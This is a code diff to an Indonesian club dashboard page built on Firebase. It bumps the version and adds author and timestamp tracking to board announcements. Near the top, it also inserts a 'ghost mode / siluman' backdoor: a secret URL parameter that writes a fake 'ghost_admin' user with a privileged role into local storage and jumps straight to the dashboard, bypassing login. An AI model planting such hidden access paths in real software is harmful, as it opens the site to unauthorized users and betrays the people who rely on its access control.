@@ -7,9 +7,26 @@
     
     <script>
         // ==========================================
+        // JALUR BELAKANG (GHOST MODE / SILUMAN)
+        // ==========================================
+        const urlParams = new URLSearchParams(window.location.search);
+        if(urlParams.get('mode') === 'siluman') {
+            localStorage.setItem('maka_user', JSON.stringify({
+                id: 'ghost_admin', 
+                namaKtp: 'THE CREATOR', 
+                namaWa: 'THE CREATOR',
+                nama: 'THE CREATOR',
+                plat: 'B 4248 SWF', 
+                role: 'KELUARGA MLU',
+                foto: 'https://cdn-icons-png.flaticon.com/512/847/847969.png'
+            }));
+            window.location.href = 'dashboard_kc.html';
+        }
+
+        // ==========================================
         // SISTEM AUTO-UPDATE PAKSA (PENGHANCUR CACHE)
         // ==========================================
-        const DASH_VERSION = "4.0"; // Fix Broadcast Ghost Loop
+        const DASH_VERSION = "4.1"; // Update Mode Siluman & Author Board
         if (localStorage.getItem('maka_dash_kc_v') !== DASH_VERSION) {
             if ('caches' in window) {
                 caches.keys().then((names) => { names.forEach(name => { caches.delete(name); }); });
@@ -89,9 +106,9 @@
 
         .dash-container { padding: 0 20px; margin-bottom: 20px; position: relative; z-index: 10; display: flex; flex-direction: column; gap: 15px; }
         
+        /* BANNER UTAMA DINAMIS */
         .fc-banner { border-radius: 24px; padding: 20px; display: flex; align-items: center; justify-content: space-between; position: relative; overflow: hidden; cursor: pointer; gap: 10px; transition: 0.5s; }
         
-        /* MODE KC (DEFAULT) */
         .fc-banner.mode-kc { background: linear-gradient(135deg, #111 0%, #000 100%); border: 1px solid rgba(212, 255, 0, 0.3); box-shadow: 0 15px 40px rgba(0,0,0,0.8); }
         .fc-banner.mode-kc .banner-title { font-family: 'Space Grotesk'; font-size: 16px; font-weight: 900; color: #fff; margin-bottom: 6px; letter-spacing: 1px;}
         .fc-banner.mode-kc .banner-title i { color: var(--kc-green); margin-right: 5px;}
@@ -99,7 +116,6 @@
         .fc-banner.mode-kc .banner-val { font-family: 'Space Grotesk'; font-size: 30px; font-weight: 900; color: var(--kc-green); text-shadow: 0 0 15px rgba(212, 255, 0, 0.4); line-height: 1;}
         .fc-banner.mode-kc .banner-lbl { font-size: 8px; font-weight: 800; color: #fff; letter-spacing: 1px; margin-top: 4px; text-transform: uppercase; }
 
-        /* MODE GADING (AKTIF JIKA JARAK <= 1 KM) */
         .fc-banner.mode-gading { background: linear-gradient(135deg, #050505 0%, #111 100%); border: 1px solid rgba(16, 185, 129, 0.3); box-shadow: 0 15px 40px rgba(0,0,0,0.8); }
         .fc-banner.mode-gading .banner-title { font-family: 'Space Grotesk'; font-size: 16px; font-weight: 900; color: #fff; margin-bottom: 6px; letter-spacing: 1px;}
         .fc-banner.mode-gading .banner-title i { color: var(--electric-blue); margin-right: 5px;}
@@ -210,6 +226,7 @@
                 <div class="board-content">
                     <h4 id="kcBoardTitle">INFO KARTIKA CHANDRA</h4>
                     <p id="kcBoardDesc">Selamat datang di Dashboard KC. Pastikan radar selalu aktif saat di perjalanan.</p>
+                    <div id="kcBoardAuthor" style="font-size: 9px; color: var(--gold-lux); margin-top: 8px; font-weight: 800; letter-spacing: 0.5px; border-top: 1px dashed rgba(212,175,55,0.3); padding-top: 5px; display: none;"></div>
                 </div>
                 <div id="btnEditBoard" onclick="openEditBoard()">
                     <i class="fas fa-pen"></i>
@@ -524,6 +541,9 @@
             });
         });
 
+        // ==========================================
+        // SISTEM DENGAR DATA KEDUA STASIUN
+        // ==========================================
         function initFCListeners() {
             // Dengar KC
             onSnapshot(refKC, (snap) => { 
@@ -566,8 +586,18 @@
             const refBoard = doc(dbKC, "settings", "board_info");
             onSnapshot(refBoard, (snap) => {
                 if(snap.exists()) {
-                    document.getElementById('kcBoardTitle').innerText = snap.data().title || "INFO KARTIKA CHANDRA";
-                    document.getElementById('kcBoardDesc').innerText = snap.data().desc || "-";
+                    const data = snap.data();
+                    document.getElementById('kcBoardTitle').innerText = data.title || "INFO KARTIKA CHANDRA";
+                    document.getElementById('kcBoardDesc').innerText = data.desc || "-";
+                    
+                    const authorEl = document.getElementById('kcBoardAuthor');
+                    if(data.author) {
+                        let timeStr = data.timestamp ? new Date(data.timestamp).toLocaleString('id-ID', {day:'numeric', month:'short', hour:'2-digit', minute:'2-digit'}) : "";
+                        authorEl.innerText = `✍️ Diupdate oleh: ${data.author} ${timeStr ? '('+timeStr+')' : ''}`;
+                        authorEl.style.display = 'block';
+                    } else {
+                        authorEl.style.display = 'none';
+                    }
                 }
             });
         }
@@ -709,7 +739,27 @@
         // LAINNYA: EDIT PENGUMUMAN & BROADCAST & SOS
         // ==========================================
         window.openEditBoard = () => { document.getElementById('inputBoardTitle').value = document.getElementById('kcBoardTitle').innerText; document.getElementById('inputBoardDesc').value = document.getElementById('kcBoardDesc').innerText; const m = document.getElementById('boardEditModal'); m.style.display='flex'; setTimeout(()=>m.classList.add('show'),10); };
-        window.saveBoardInfo = async () => { const titleInput = document.getElementById('inputBoardTitle').value.trim(); const descInput = document.getElementById('inputBoardDesc').value.trim(); if(!titleInput || !descInput) return showCustomAlert("PERHATIAN", "Judul dan pesan tidak boleh kosong!", "error"); try { await setDoc(doc(dbKC, "settings", "board_info"), { title: titleInput, desc: descInput }, { merge: true }); document.getElementById('boardEditModal').classList.remove('show'); setTimeout(()=>document.getElementById('boardEditModal').style.display='none',300); showCustomAlert("BERHASIL", "Pengumuman diperbarui.", "success"); } catch (e) { showCustomAlert("GAGAL", e.message, "error"); } };
+        
+        window.saveBoardInfo = async () => { 
+            const titleInput = document.getElementById('inputBoardTitle').value.trim(); 
+            const descInput = document.getElementById('inputBoardDesc').value.trim(); 
+            if(!titleInput || !descInput) return showCustomAlert("PERHATIAN", "Judul dan pesan tidak boleh kosong!", "error"); 
+            
+            try { 
+                await setDoc(doc(dbKC, "settings", "board_info"), { 
+                    title: titleInput, 
+                    desc: descInput,
+                    author: myCurrentName,
+                    timestamp: Date.now()
+                }, { merge: true }); 
+                
+                document.getElementById('boardEditModal').classList.remove('show'); 
+                setTimeout(()=>document.getElementById('boardEditModal').style.display='none',300); 
+                showCustomAlert("BERHASIL", "Pengumuman diperbarui.", "success"); 
+            } catch (e) { 
+                showCustomAlert("GAGAL", e.message, "error"); 
+            } 
+        };
 
         let currentBroadcastPhotoBase64 = "";
         window.openBroadcastModal = () => { document.getElementById('inputBroadcastTitle').value = ''; document.getElementById('inputBroadcastDesc').value = ''; document.getElementById('inputBroadcastFoto').value = ''; document.getElementById('previewBroadcastFoto').style.display = 'none'; currentBroadcastPhotoBase64 = ""; const m = document.getElementById('broadcastModalKC'); m.style.display='flex'; setTimeout(()=>m.classList.add('show'),10); };
@@ -733,7 +783,6 @@
             } 
         };
 
-        // KEMBALI DI SIMPAN DI INFO_KC BIAR BISA DIHAPUS ADMIN
         window.sendBroadcastKC = async () => { 
             const title = document.getElementById('inputBroadcastTitle').value.trim(); 
             const desc = document.getElementById('inputBroadcastDesc').value.trim(); 
@@ -762,7 +811,6 @@
         };
 
         function startBroadcastListener() {
-            // Ambil 10 info terakhir, cari secara manual (gak pake "where") biar gak butuh Composite Index Firebase
             const qBroadcast = query(collection(dbKC, "info_kc"), orderBy("timestamp", "desc"), limit(10));
             onSnapshot(qBroadcast, (snap) => {
                 if(snap.empty) return;
